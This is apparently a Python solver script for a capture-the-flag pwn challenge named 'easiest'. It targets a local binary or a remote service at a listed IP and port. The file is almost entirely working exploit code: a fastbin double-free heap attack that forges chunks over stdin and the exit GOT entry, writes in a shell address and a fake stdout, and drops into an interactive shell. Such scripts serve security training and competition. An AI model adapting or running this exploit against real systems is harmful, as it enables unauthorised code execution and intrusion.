#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './easiest'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'39.96.9.148', 'port':9999})
env.select()

#==========

binf = ELF(bin_file)
addr_shell          = 0x400946
addr_got_exit       = binf.got['exit']
addr_bss            = binf.sep_section['.bss']
addr_stdin          = binf.symbols['stdin']

addr_fake_stdout    = addr_bss - 0x68
addr_list           = addr_bss + 0x20

#==========

def attack(conn):
    ez = Easiest(conn)

    ez.add(0, 0x68, 'a'*8)
    ez.add(1, 0x68, 'b'*8)
    ez.delete(0)
    ez.delete(1)
    ez.delete(0)

    ez.add(0, 0x68, p64(addr_stdin + (5 - 8)))
    ez.add(0, 0x68, 'c'*8)
    ez.add(0, 0x68, 'd'*8)
    ez.add(1, 0x68, ('X'*3)+p64(addr_bss+0x100)+('\x00'*0x48)+p64((addr_bss-0x10)-0x38))

    ez.add(2, 0x38, 'A'*8)
    ez.add(3, 0x38, 'B'*8)
    ez.delete(2)
    ez.delete(3)
    ez.delete(2)

    ez.add(2, 0x38, p64(addr_got_exit + (2 - 8)))
    ez.add(2, 0x38, 'C'*8)
    ez.add(2, 0x38, 'D'*8)
    ez.add(3, 0x38, (('X'*6)+p64(addr_shell)).ljust(0x16, '\x00')+p64(addr_fake_stdout))

    conn.sendline('1')
    
class Easiest:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, idx, size, data):
        if env.check('remote'):
            self.sendlineafter('delete \n', '1\n{}\n{}\n{}'.format(idx, size, data))
        else:
            self.sendlineafter('delete \n', '1')
            self.sendlineafter('(0-11):', str(idx))
            self.sendlineafter('Length:', str(size))
            self.sendlineafter('C:', data)

    def delete(self, idx):
        if env.check('remote'):
            self.sendlineafter('delete \n', '2\n{}'.format(idx))
        else:
            self.sendlineafter('delete \n', '2')
            self.sendlineafter('(0-11):', str(idx))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
